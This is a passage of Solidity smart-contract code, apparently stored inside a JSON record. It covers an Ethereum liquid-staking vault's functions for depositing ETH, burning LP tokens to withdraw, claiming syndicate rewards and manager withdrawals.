IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(msg.value == _amount, \"Must provide correct amount of ETH\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        // Give anything owed to the user before making updates to user state\n        LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if (address(tokenForKnot) != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                msg.sender,\n                address(tokenForKnot),\n                tokenForKnot.balanceOf(msg.sender),\n                msg.sender\n            );\n        }\n\n        _depositETHForStaking(_blsPublicKeyOfKnot, _amount, true);\n\n        // Ensure user cannot get historical rewards\n        tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n\n        return _amount;\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked by BLS public key\n    /// @param _blsPublicKeys List of BLS public keys that received ETH for staking\n    /// @param _amounts List of amounts of LP tokens being burnt\n    function burnLPTokensForETHByBLS(bytes[] calldata _blsPublicKeys, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _blsPublicKeys.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            LPToken token = lpTokenForKnot[_blsPublicKeys[i]];\n            require(address(token) != address(0), \"No ETH staked for specified BLS key\");\n            burnLPForETH(token, _amounts[i]);\n        }\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked\n    /// @param _lpTokens Address of LP tokens being burnt\n    /// @param _amounts Amount of LP tokens being burnt\n    function burnLPTokensForETH(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _lpTokens.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            burnLPForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice For a user that has deposited ETH that has not been staked, allow them to burn LP to get ETH back\n    /// @param _lpToken Address of the LP token being burnt\n    /// @param _amount Amount of LP token being burnt\n    function burnLPForETH(LPToken _lpToken, uint256 _amount) public nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _lpToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(address(_lpToken) != address(0), \"Zero address specified\");\n\n        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Cannot burn LP tokens\"\n        );\n        require(_lpToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Too new\");\n\n        updateAccumulatedETHPerLP();\n\n        _lpToken.burn(msg.sender, _amount);\n\n        (bool result,) = msg.sender.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n        emit ETHWithdrawnByDepositor(msg.sender, _amount);\n\n        emit LPTokenBurnt(blsPublicKeyOfKnot, address(_lpToken), msg.sender, _amount);\n    }\n\n    /// @notice Any LP tokens for BLS keys that have had their derivatives minted can claim ETH from the syndicate contract\n    /// @param _blsPubKeys List of BLS public keys being processed\n    function claimRewards(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\n    /// @notice function to allow admins to withdraw ETH from the vault for staking purpose\n    /// @param _wallet address of the smart wallet that receives ETH\n    /// @param _amount number of ETH withdrawn\n    /// @return number of ETH withdrawn\n    function withdrawETH(address _wallet, uint256 _amount) public onlyManager nonReentrant returns (uint256) {\n        require(_amount >= 4 ether, \"Amount cannot be less than 4 ether\");\n        require(_amount <= address(this).balance, \"Not enough ETH to withdraw\");\n        require(_wallet != address(0), \"Zero address\");\n\n        (bool result,) = _wallet.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n\n        emit ETHWithdrawn(_wallet, msg.sender, _amount);\n\n        return _amount;\n    }\n\n    /// @notice For any knots that are no longer part of syndicate facilitate unstaking so that knot can rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function unstakeSyndicateSharesForRageQuit(\n        address _sETHRecipient,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyManager nonReentrant {\n        Syndicate syndicate = Syndicate(payable(liquidStakingNetworkManager.syndicate()));\n\n        _claimFundsFromSyndicateForDistribution(address(syndicate), _blsPublicKeys);\n\n        updateAccumulatedETHPerLP();\n\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            require(syndicate.isNoLongerPartOfSyndicate(_blsPublicKeys[i]), \"Knot is still active in syndicate\");\n        }\n\n        syndicate.unstake(address(this), _sETHRecipient, _blsPublicKeys, _amounts);\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETHByBLSKeys(address _user, bytes[] calldata _blsPubKeys) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            totalAccumulated"
    }
  ]
}